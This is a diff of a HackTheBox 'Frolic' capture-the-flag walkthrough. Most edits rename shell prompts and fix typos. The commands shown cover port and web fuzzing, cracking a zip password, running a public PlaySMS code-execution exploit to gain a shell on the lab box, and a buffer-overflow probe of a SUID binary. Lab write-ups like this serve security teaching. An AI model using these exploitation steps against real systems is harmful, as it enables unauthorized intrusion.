@@ -21,7 +21,7 @@ Before following this walkthrough, I highly recommend trying to get the flag you
 First up, we'll scan the box using basic nmap scripts and then go from there (Enumerate!).
 
 ```bash
-root@noone:/home/pswapnil/Curling# nmap -v -p- -sC -sV -oA nmap 10.10.10.111
+root@kali:~/Frolic# nmap -v -p- -sC -sV -oA nmap 10.10.10.111
 # Nmap 7.70 scan initiated Thu Feb 14 11:48:48 2019 as: nmap -v -p- -sC -sV -oA nmap 10.10.10.111
 Nmap scan report for 10.10.10.111
 Host is up (0.25s latency).
@@ -91,8 +91,8 @@ Visting the pages, I found this..
 Let's use `wfuzz` on `http://10.10.10.111:9999/`
 
 ```bash
-root@noone:/home/pswapnil/Retired/Frolic# wfuzz --hc 404 -w /usr/share/wordlists/wfuzz/general/common.txt http://10.10.10.111:9999/FUZZ > fuzzresult
-Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                                         
+root@kali:~/Frolic# wfuzz --hc 404 -w /usr/share/wordlists/wfuzz/general/common.txt http://10.10.10.111:9999/FUZZ > fuzzresult
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation for more information.                                                         
 
 ********************************************************
 * Wfuzz 2.2.11 - The Web Fuzzer                        *
@@ -140,25 +140,25 @@ Well that's something. Got another directory. Let's go there.
 
 ![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/b64text.png)
 
-Not again. Well at least it's not weird, it's base64, at least look like it. I will copy the text in a file and try to decode it.
+Not again. Well at least it's not weird, it's base64, at least looks like it. I will copy the text in a file and try to decode it.
 
 ```bash
-pswapnil@noone:~/Retired/Frolic$ base64 -d out.b64 > b64result
-pswapnil@noone:~/Retired/Frolic$ file b64result
+root@kali:~/Frolic# base64 -d out.b64 > b64result
+root@kali:~/Frolic# file b64result
 b64result: Zip archive data, at least v2.0 to extract
-pswapnil@noone:~/Retired/Frolic$ mv b64result b64result.zip
-pswapnil@noone:~/Retired/Frolic$ unzip b64result.zip
+root@kali:~/Frolic# mv b64result b64result.zip
+root@kali:~/Frolic# unzip b64result.zip
 Archive:  b64result.zip
 [b64result.zip] index.php password:
-root@noone:/home/pswapnil/Retired/Frolic# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt b64out.zip
+root@kali:~/Frolic# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt b64out.zip
 
 
 PASSWORD FOUND!!!!: pw == password
-root@noone:/home/pswapnil/Retired/Frolic# unzip b64out.zip
+root@kali:~/Frolic# unzip b64out.zip
 Archive:  b64out.zip
 [b64out.zip] index.php password:
   inflating: index.php
-root@noone:/home/pswapnil/Retired/Frolic# cat index.php
+root@kali:~/Frolic# cat index.php
 4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
 ```
 
@@ -169,8 +169,8 @@ Let's convert the hex to ascii using some tool. This is getting boring now.
 Oh would you just! Again some base64. I am sure this time because of the padding.
 
 ```bash
-pswapnil@noone:~/Retired/Frolic$ base64 -d htoa > htoab64out
-root@noone:/home/pswapnil/Retired/Frolic# cat htoab64out
+root@kali:~/Frolic# base64 -d htoa > htoab64out
+root@kali:~/Frolic# cat htoab64out
 +++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
 ++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
 <]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
@@ -193,9 +193,9 @@ Two files. Let's visit the path ...
 I could not see the `/dev` path so, I tried a `wfuzz` on it.
 
 ```bash
-root@noone:/home/pswapnil/Retired/Frolic# wfuzz --hc 404 -w /usr/share/wordlists/wfuzz/general/common.txt http://10.10.10.111:9999/dev/FUZZ
+root@kali:~/Frolic# wfuzz --hc 404 -w /usr/share/wordlists/wfuzz/general/common.txt http://10.10.10.111:9999/dev/FUZZ
 
-Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation for more information.
 
 ********************************************************
 * Wfuzz 2.2.11 - The Web Fuzzer                        *
@@ -230,7 +230,7 @@ A login form. Let's try the two usernames and passwords we have until now. The t
 I did a searchsploit on `playsms` and got this.
 
 ```bash
-root@noone:/home/pswapnil/Retired/Frolic# searchsploit playsms
+root@kali:~/Frolic# searchsploit playsms
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
  Exploit Title                                                                                                                                                                               |  Path
                                                                                                                                                                                              | (/usr/share/exploitdb/)
@@ -238,7 +238,7 @@ root@noone:/home/pswapnil/Retired/Frolic# searchsploit playsms
 PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)                                                                                                           | exploits/php/remote/44598.rb
 PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload                                                                                                           | exploits/php/webapps/42003.txt
 PlaySMS 1.4 - 'import.php' Remote Code Execution                                                                                                                                             | exploits/php/webapps/42044.txt
-PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)                                                                                                       | exploits/php/remote/44599.rb
+PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)'                                                                                                       | exploits/php/remote/44599.rb
 PlaySMS 1.4 - Remote Code Execution                                                                                                                                                          | exploits/php/webapps/42038.txt
 PlaySms 0.7 - SQL Injection                                                                                                                                                                  | exploits/linux/remote/404.pl
 PlaySms 0.8 - 'index.php' Cross-Site Scripting                                                                                                                                               | exploits/php/webapps/26871.txt
@@ -253,7 +253,7 @@ Shellcodes: No Result
 I used this [exploit](https://github.com/jasperla/CVE-2017-9101) to get a shell.
 
 ```bash
-root@noone:/home/pswapnil/Retired/Frolic/CVE-2017-9101# python3 playsmshell.py --password idkwhatispass --url http://10.10.10.111:9999/playsms -i
+root@kali:~/Frolic/CVE-2017-9101# python3 playsmshell.py --password idkwhatispass --url http://10.10.10.111:9999/playsms -i
 [*] Grabbing CSRF token for login
 [*] Attempting to login as admin
 [+] Logged in!
@@ -291,13 +291,13 @@ www-data@frolic:/home/ayush/.binary$ cat /proc/sys/kernel/randomize_va_space
 So, ASLR is disabled. I downloaded the binary on my local machine to try and debug it.
 
 ```bash
-root@kali# ./rop
+root@kali:~/Frolic# ./rop
 [*] Usage: program <message>
 
-root@kali# ./rop $(python -c 'print "A"*10')
+root@kali:~/Frolic# ./rop $(python -c 'print "A"*10')
 [+] Message sent: AAAAAAAAAA
 
-root@kali# ./rop $(python -c 'print "A"*500')
+root@kali:~/Frolic# ./rop $(python -c 'print "A"*500')
 Segmentation fault
 ```
 
